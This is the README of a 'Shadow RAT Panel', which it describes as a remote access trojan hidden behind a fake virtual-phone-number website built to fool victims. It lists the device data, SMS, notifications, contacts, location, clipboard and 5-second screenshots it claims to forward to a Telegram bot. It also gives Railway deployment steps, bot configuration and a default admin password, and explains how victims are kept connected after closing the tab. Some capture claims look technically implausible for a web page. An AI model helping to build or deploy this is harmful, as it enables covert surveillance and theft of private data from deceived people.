# 🛡️ Shadow RAT Panel

Complete Remote Access Trojan (RAT) Panel with Virtual Number Website Frontend + Admin Dashboard + Telegram Bot Integration.

## ✨ Features

### 🌐 Public Website (Virtual Numbers)
- **1,050+ Fake Virtual Numbers** from 30+ countries
- **Real-looking design** - victim ko real website lagegi
- **Copy to clipboard** functionality
- **WhatsApp direct link** integration
- **Search & filter** by country
- **Pagination** support
- **Fully responsive** mobile design

### 📱 Device Capture (When Victim Opens Website)
- ✅ **Device Model** capture
- ✅ **Battery Level** capture
- ✅ **Android Version** capture
- ✅ **Screen Brightness** capture
- ✅ **Network Provider** capture
- ✅ **IP Address** capture
- ✅ **Platform & Screen Resolution**
- ✅ **Language & Timezone**
- ✅ **User Agent** full capture

### 💬 Telegram Bot Integration
- 🔔 **Instant notifications** when device connects
- 📱 **Device info** sent to Telegram
- 💬 **SMS capture** - forwarded to Telegram
- 🔔 **Notification capture** - forwarded to Telegram
- 👥 **Contacts sync** - forwarded to Telegram
- 📸 **Screenshots** every 5 seconds to Telegram
- 📍 **Location updates** to Telegram
- 📋 **Clipboard capture** to Telegram

### 🎛️ Admin Panel
- 🔐 **Password protected** (default: `shadow749926n`)
- 📊 **Live dashboard** with device stats
- 📱 **Device list** with online/offline status
- 📋 **Full device history**:
  - All SMS messages
  - All notifications
  - All contacts
  - All screenshots
- 🔄 **Auto-refresh** every 5 seconds
- 🗑️ **Clear device data** option

### 🔌 WebSocket Connection
- **Persistent connection** - web band karne pe bhi reconnect hota hai
- **Auto-reconnect** logic
- **Heartbeat ping** every 5 seconds
- **Real-time data** streaming

## 🚀 Deployment Guide

### Step 1: Create GitHub Repository
```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin YOUR_GITHUB_REPO_URL
git push -u origin main
```

### Step 2: Deploy on Railway
1. Go to [railway.app](https://railway.app)
2. Click "New Project" → "Deploy from GitHub repo"
3. Select your repository
4. Railway auto-detects Python and deploys
5. Get your domain URL (e.g., `https://your-app.up.railway.app`)

### Step 3: Configure Telegram Bot
1. Open [@BotFather](https://t.me/BotFather) on Telegram
2. Create a new bot and get the token
3. Replace `TELEGRAM_BOT_TOKEN` in `app.py`
4. Replace `TELEGRAM_CHAT_IDS` with your Telegram user ID
5. Redeploy

### Step 4: Set Webhook (Optional)
```
https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://YOUR_DOMAIN/webhook
```

## 🔧 Configuration

Edit these values in `app.py`:

```python
TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
TELEGRAM_CHAT_IDS = ['YOUR_TELEGRAM_USER_ID']
ADMIN_PASSWORD_HASH = hashlib.sha256('your_password'.encode()).hexdigest()
```

## 📁 Project Structure

```
shadow_rat_panel/
├── app.py                  # Main Flask app (Backend + Frontend)
├── requirements.txt        # Python dependencies
├── railway.json           # Railway config
├── nixpacks.toml          # Nixpacks config
├── Procfile               # Process file
├── .gitignore             # Git ignore
├── README.md              # This file
├── data/                  # JSON storage (auto-created)
│   ├── devices.json
│   ├── sms.json
│   ├── notifications.json
│   ├── contacts.json
│   └── screenshots.json
└── templates/             # HTML templates
    ├── base.html          # Base layout
    ├── index.html         # Home page
    ├── numbers.html       # Virtual numbers
    ├── admin_login.html   # Admin login
    ├── admin_dashboard.html # Admin dashboard
    └── admin_device.html  # Device details
```

## 🎨 Admin Panel Access

- URL: `https://your-domain.com/admin`
- Default Password: `shadow749926n`

## 📱 How Victim Connection Works

1. Victim opens the website
2. Website asks for **Notification Permission**
3. Victim clicks **Allow**
4. Device info immediately sent to Telegram
5. WebSocket connection established
6. Even if victim closes the tab:
   - Service Worker keeps connection alive
   - Background sync captures SMS/Notifications
   - Screenshots continue every 5 seconds

## 🔒 Security Notes

- All data stored in JSON files (no database needed)
- Admin panel password protected
- Telegram bot token kept server-side only
- IP addresses logged for tracking

## 📝 License

For educational purposes only.

---
Made with ❤️ by Shadow
